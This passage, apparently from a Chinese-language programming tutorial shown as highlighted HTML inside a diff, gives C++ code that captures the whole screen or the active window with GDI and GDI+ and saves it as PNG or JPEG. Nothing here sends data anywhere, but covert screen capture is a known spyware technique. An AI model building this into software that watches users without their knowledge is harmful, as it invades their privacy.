+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Region captured</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span></code></pre><h3 id="section-9">2. 高级屏幕截图技术</h3><pre class="shiki github-dark" style="background-color:#24292e;color:#e1e4e8" tabindex="0"><code><span class="line"><span style="color:#6A737D">// advanced_screen_capture.cpp</span></span>
+<span class="line"><span style="color:#6A737D">// 高级屏幕截图技术</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;windows.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;gdiplus.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;stdio.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;string></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;vector></span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">#pragma</span><span style="color:#B392F0"> comment</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">lib</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"gdiplus.lib"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 高级屏幕截图类</span></span>
+<span class="line"><span style="color:#F97583">class</span><span style="color:#B392F0"> AdvancedScreenCapture</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#F97583">private:</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#E1E4E8"> ULONG_PTR gdiplusToken;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">public:</span></span>
+<span class="line"><span style="color:#6A737D">    // 初始化GDI+</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#F97583"> bool</span><span style="color:#B392F0"> InitializeGDIPlus</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#B392F0">        Gdiplus</span><span style="color:#E1E4E8">::GdiplusStartupInput gdiplusStartupInput;</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">Gdiplus</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">GdiplusStartup</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">gdiplusToken, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">gdiplusStartupInput, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">==</span><span style="color:#B392F0"> Gdiplus</span><span style="color:#E1E4E8">::Ok);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 清理GDI+</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#F97583"> void</span><span style="color:#B392F0"> ShutdownGDIPlus</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#B392F0">        Gdiplus</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">GdiplusShutdown</span><span style="color:#E1E4E8">(gdiplusToken);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 截取屏幕并保存为PNG</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#F97583"> bool</span><span style="color:#B392F0"> CaptureScreenToPNG</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> filename</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#6A737D">        // 获取屏幕尺寸</span></span>
+<span class="line"><span style="color:#F97583">        int</span><span style="color:#E1E4E8"> screenWidth </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetSystemMetrics</span><span style="color:#E1E4E8">(SM_CXSCREEN);</span></span>
+<span class="line"><span style="color:#F97583">        int</span><span style="color:#E1E4E8"> screenHeight </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetSystemMetrics</span><span style="color:#E1E4E8">(SM_CYSCREEN);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 获取屏幕DC</span></span>
+<span class="line"><span style="color:#E1E4E8">        HDC hScreenDC </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetDC</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">hScreenDC) </span><span style="color:#F97583">return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 创建内存DC</span></span>
+<span class="line"><span style="color:#E1E4E8">        HDC hMemoryDC </span><span style="color:#F97583">=</span><span style="color:#B392F0"> CreateCompatibleDC</span><span style="color:#E1E4E8">(hScreenDC);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">hMemoryDC) {</span></span>
+<span class="line"><span style="color:#B392F0">            ReleaseDC</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, hScreenDC);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 创建DIB段</span></span>
+<span class="line"><span style="color:#E1E4E8">        BITMAPINFO bmi </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> {</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">};</span></span>
+<span class="line"><span style="color:#E1E4E8">        bmi.bmiHeader.biSize </span><span style="color:#F97583">=</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(BITMAPINFOHEADER);</span></span>
+<span class="line"><span style="color:#E1E4E8">        bmi.bmiHeader.biWidth </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> screenWidth;</span></span>
+<span class="line"><span style="color:#E1E4E8">        bmi.bmiHeader.biHeight </span><span style="color:#F97583">=</span><span style="color:#F97583"> -</span><span style="color:#E1E4E8">screenHeight;</span><span style="color:#6A737D"> // 负值表示顶-down DIB</span></span>
+<span class="line"><span style="color:#E1E4E8">        bmi.bmiHeader.biPlanes </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        bmi.bmiHeader.biBitCount </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 32</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        bmi.bmiHeader.biCompression </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> BI_RGB;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        VOID</span><span style="color:#F97583">*</span><span style="color:#E1E4E8"> bits </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> nullptr</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        HBITMAP hBitmap </span><span style="color:#F97583">=</span><span style="color:#B392F0"> CreateDIBSection</span><span style="color:#E1E4E8">(hMemoryDC, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">bmi, DIB_RGB_COLORS, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">bits, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">hBitmap) {</span></span>
+<span class="line"><span style="color:#B392F0">            DeleteDC</span><span style="color:#E1E4E8">(hMemoryDC);</span></span>
+<span class="line"><span style="color:#B392F0">            ReleaseDC</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, hScreenDC);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 选择位图</span></span>
+<span class="line"><span style="color:#E1E4E8">        HGDIOBJ hOldBitmap </span><span style="color:#F97583">=</span><span style="color:#B392F0"> SelectObject</span><span style="color:#E1E4E8">(hMemoryDC, hBitmap);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 复制屏幕内容</span></span>
+<span class="line"><span style="color:#B392F0">        BitBlt</span><span style="color:#E1E4E8">(hMemoryDC, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, screenWidth, screenHeight, hScreenDC, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, SRCCOPY);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 创建GDI+ Bitmap</span></span>
+<span class="line"><span style="color:#B392F0">        Gdiplus</span><span style="color:#E1E4E8">::Bitmap</span><span style="color:#F97583">*</span><span style="color:#E1E4E8"> pBitmap </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#B392F0"> Gdiplus</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">Bitmap</span><span style="color:#E1E4E8">(screenWidth, screenHeight, </span></span>
+<span class="line"><span style="color:#E1E4E8">                                                       screenWidth </span><span style="color:#F97583">*</span><span style="color:#79B8FF"> 4</span><span style="color:#E1E4E8">, PixelFormat32bppARGB, </span></span>
+<span class="line"><span style="color:#E1E4E8">                                                       (BYTE</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)bits);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 保存为PNG</span></span>
+<span class="line"><span style="color:#E1E4E8">        CLSID clsid;</span></span>
+<span class="line"><span style="color:#B392F0">        GetEncoderClsid</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">L"image/png"</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">clsid);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#B392F0">        std</span><span style="color:#E1E4E8">::wstring </span><span style="color:#B392F0">wFilename</span><span style="color:#E1E4E8">(filename, filename </span><span style="color:#F97583">+</span><span style="color:#B392F0"> strlen</span><span style="color:#E1E4E8">(filename));</span></span>
+<span class="line"><span style="color:#B392F0">        Gdiplus</span><span style="color:#E1E4E8">::Status status </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> pBitmap-></span><span style="color:#B392F0">Save</span><span style="color:#E1E4E8">(wFilename.</span><span style="color:#B392F0">c_str</span><span style="color:#E1E4E8">(), </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">clsid, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 清理</span></span>
+<span class="line"><span style="color:#F97583">        delete</span><span style="color:#E1E4E8"> pBitmap;</span></span>
+<span class="line"><span style="color:#B392F0">        SelectObject</span><span style="color:#E1E4E8">(hMemoryDC, hOldBitmap);</span></span>
+<span class="line"><span style="color:#B392F0">        DeleteObject</span><span style="color:#E1E4E8">(hBitmap);</span></span>
+<span class="line"><span style="color:#B392F0">        DeleteDC</span><span style="color:#E1E4E8">(hMemoryDC);</span></span>
+<span class="line"><span style="color:#B392F0">        ReleaseDC</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, hScreenDC);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> (status </span><span style="color:#F97583">==</span><span style="color:#B392F0"> Gdiplus</span><span style="color:#E1E4E8">::Ok);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 截取活动窗口</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#F97583"> bool</span><span style="color:#B392F0"> CaptureActiveWindow</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> filename</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#6A737D">        // 获取活动窗口</span></span>
+<span class="line"><span style="color:#E1E4E8">        HWND hWnd </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetForegroundWindow</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">hWnd) </span><span style="color:#F97583">return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 获取窗口位置和大小</span></span>
+<span class="line"><span style="color:#E1E4E8">        RECT rect;</span></span>
+<span class="line"><span style="color:#B392F0">        GetWindowRect</span><span style="color:#E1E4E8">(hWnd, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">rect);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        int</span><span style="color:#E1E4E8"> width </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> rect.right </span><span style="color:#F97583">-</span><span style="color:#E1E4E8"> rect.left;</span></span>
+<span class="line"><span style="color:#F97583">        int</span><span style="color:#E1E4E8"> height </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> rect.bottom </span><span style="color:#F97583">-</span><span style="color:#E1E4E8"> rect.top;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 获取窗口DC</span></span>
+<span class="line"><span style="color:#E1E4E8">        HDC hWindowDC </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetDC</span><span style="color:#E1E4E8">(hWnd);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">hWindowDC) </span><span style="color:#F97583">return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 创建内存DC</span></span>
+<span class="line"><span style="color:#E1E4E8">        HDC hMemoryDC </span><span style="color:#F97583">=</span><span style="color:#B392F0"> CreateCompatibleDC</span><span style="color:#E1E4E8">(hWindowDC);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">hMemoryDC) {</span></span>
+<span class="line"><span style="color:#B392F0">            ReleaseDC</span><span style="color:#E1E4E8">(hWnd, hWindowDC);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 创建位图</span></span>
+<span class="line"><span style="color:#E1E4E8">        HBITMAP hBitmap </span><span style="color:#F97583">=</span><span style="color:#B392F0"> CreateCompatibleBitmap</span><span style="color:#E1E4E8">(hWindowDC, width, height);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">hBitmap) {</span></span>
+<span class="line"><span style="color:#B392F0">            DeleteDC</span><span style="color:#E1E4E8">(hMemoryDC);</span></span>
+<span class="line"><span style="color:#B392F0">            ReleaseDC</span><span style="color:#E1E4E8">(hWnd, hWindowDC);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 选择位图</span></span>
+<span class="line"><span style="color:#E1E4E8">        HGDIOBJ hOldBitmap </span><span style="color:#F97583">=</span><span style="color:#B392F0"> SelectObject</span><span style="color:#E1E4E8">(hMemoryDC, hBitmap);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 复制窗口内容</span></span>
+<span class="line"><span style="color:#B392F0">        PrintWindow</span><span style="color:#E1E4E8">(hWnd, hMemoryDC, PW_CLIENTONLY);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 保存位图</span></span>
+<span class="line"><span style="color:#F97583">        bool</span><span style="color:#E1E4E8"> result </span><span style="color:#F97583">=</span><span style="color:#B392F0"> SaveBitmapToJPEG</span><span style="color:#E1E4E8">(hBitmap, hMemoryDC, filename);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 清理</span></span>
+<span class="line"><span style="color:#B392F0">        SelectObject</span><span style="color:#E1E4E8">(hMemoryDC, hOldBitmap);</span></span>
+<span class="line"><span style="color:#B392F0">        DeleteObject</span><span style="color:#E1E4E8">(hBitmap);</span></span>
+<span class="line"><span style="color:#B392F0">        DeleteDC</span><span style="color:#E1E4E8">(hMemoryDC);</span></span>
+<span class="line"><span style="color:#B392F0">        ReleaseDC</span><span style="color:#E1E4E8">(hWnd, hWindowDC);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> result;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">private:</span></span>
+<span class="line"><span style="color:#6A737D">    // 获取图像编码器CLSID</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#F97583"> int</span><span style="color:#B392F0"> GetEncoderClsid</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">const</span><span style="color:#B392F0"> WCHAR</span><span style="color:#F97583">*</span><span style="color:#FFAB70"> format</span><span style="color:#E1E4E8">, </span><span style="color:#B392F0">CLSID</span><span style="color:#F97583">*</span><span style="color:#FFAB70"> pClsid</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">        UINT num </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        UINT size </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#B392F0">        Gdiplus</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">GetImageEncodersSize</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">num, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">size);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (size </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">return</span><span style="color:#F97583"> -</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#B392F0">        Gdiplus</span><span style="color:#E1E4E8">::ImageCodecInfo</span><span style="color:#F97583">*</span><span style="color:#E1E4E8"> pImageCodecInfo </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">Gdiplus</span><span style="color:#E1E4E8">::ImageCodecInfo</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)</span><span style="color:#B392F0">malloc</span><span style="color:#E1E4E8">(size);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">pImageCodecInfo) </span><span style="color:#F97583">return</span><span style="color:#F97583"> -</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#B392F0">        Gdiplus</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">GetImageEncoders</span><span style="color:#E1E4E8">(num, size, pImageCodecInfo);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        for</span><span style="color:#E1E4E8"> (UINT i </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">; i </span><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8"> num; </span><span style="color:#F97583">++</span><span style="color:#E1E4E8">i) {</span></span>
+<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">wcscmp</span><span style="color:#E1E4E8">(pImageCodecInfo[i].MimeType, format) </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">                *</span><span style="color:#E1E4E8">pClsid </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> pImageCodecInfo[i].Clsid;</span></span>
+<span class="line"><span style="color:#B392F0">                free</span><span style="color:#E1E4E8">(pImageCodecInfo);</span></span>
+<span class="line"><span style="color:#F97583">                return</span><span style="color:#E1E4E8"> i;</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#B392F0">        free</span><span style="color:#E1E4E8">(pImageCodecInfo);</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#F97583"> -</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 保存位图为JPEG</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#F97583"> bool</span><span style="color:#B392F0"> SaveBitmapToJPEG</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">HBITMAP</span><span style="color:#FFAB70"> hBitmap</span><span style="color:#E1E4E8">, </span><span style="color:#B392F0">HDC</span><span style="color:#FFAB70"> hDC</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> filename</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#6A737D">        // 获取位图信息</span></span>
+<span class="line"><span style="color:#E1E4E8">        BITMAP bmp;</span></span>
+<span class="line"><span style="color:#B392F0">        GetObject</span><span style="color:#E1E4E8">(hBitmap, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(BITMAP), </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">bmp);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 创建GDI+ Bitmap</span></span>
+<span class="line"><span style="color:#B392F0">        Gdiplus</span><span style="color:#E1E4E8">::Bitmap</span><span style="color:#F97583">*</span><span style="color:#E1E4E8"> pBitmap </span><span style="color:#F97583">=</span><span style="color:#B392F0"> Gdiplus</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">Bitmap</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">FromHBITMAP</span><span style="color:#E1E4E8">(hBitmap, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">pBitmap) </span><span style="color:#F97583">return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 设置JPEG质量参数</span></span>
+<span class="line"><span style="color:#B392F0">        Gdiplus</span><span style="color:#E1E4E8">::EncoderParameters encoderParams;</span></span>
+<span class="line"><span style="color:#E1E4E8">        encoderParams.Count </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        encoderParams.Parameter[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">].Guid </span><span style="color:#F97583">=</span><span style="color:#B392F0"> Gdiplus</span><span style="color:#E1E4E8">::EncoderQuality;</span></span>
+<span class="line"><span style="color:#E1E4E8">        encoderParams.Parameter[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">].Type </span><span style="color:#F97583">=</span><span style="color:#B392F0"> Gdiplus</span><span style="color:#E1E4E8">::EncoderParameterValueTypeLong;</span></span>
+<span class="line"><span style="color:#E1E4E8">        encoderParams.Parameter[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">].NumberOfValues </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        ULONG quality </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 90</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        encoderParams.Parameter[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">].Value </span><span style="color:#F97583">=</span><span style="color:#F97583"> &#x26;</span><span style="color:#E1E4E8">quality;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 获取JPEG编码器</span></span>
+<span class="line"><span style="color:#E1E4E8">        CLSID clsid;</span></span>
+<span class="line"><span style="color:#B392F0">        GetEncoderClsid</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">L"image/jpeg"</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">clsid);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 转换文件名为宽字符</span></span>
+<span class="line"><span style="color:#B392F0">        std</span><span style="color:#E1E4E8">::wstring </span><span style="color:#B392F0">wFilename</span><span style="color:#E1E4E8">(filename, filename </span><span style="color:#F97583">+</span><span style="color:#B392F0"> strlen</span><span style="color:#E1E4E8">(filename));</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 保存</span></span>
+<span class="line"><span style="color:#B392F0">        Gdiplus</span><span style="color:#E1E4E8">::Status status </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> pBitmap-></span><span style="color:#B392F0">Save</span><span style="color:#E1E4E8">(wFilename.</span><span style="color:#B392F0">c_str</span><span style="color:#E1E4E8">(), </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">clsid, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">encoderParams);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        delete</span><span style="color:#E1E4E8"> pBitmap;</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> (status </span><span style="color:#F97583">==</span><span style="color:#B392F0"> Gdiplus</span><span style="color:#E1E4E8">::Ok);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">};</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// GDI+ Token</span></span>
+<span class="line"><span style="color:#E1E4E8">ULONG_PTR </span><span style="color:#B392F0">AdvancedScreenCapture</span><span style="color:#E1E4E8">::gdiplusToken </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 测试高级截图功能</span></span>
+<span class="line"><span style="color:#F97583">void</span><span style="color:#B392F0"> TestAdvancedCapture</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"=== Advanced Screen Capture Test ===</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 初始化GDI+</span></span>
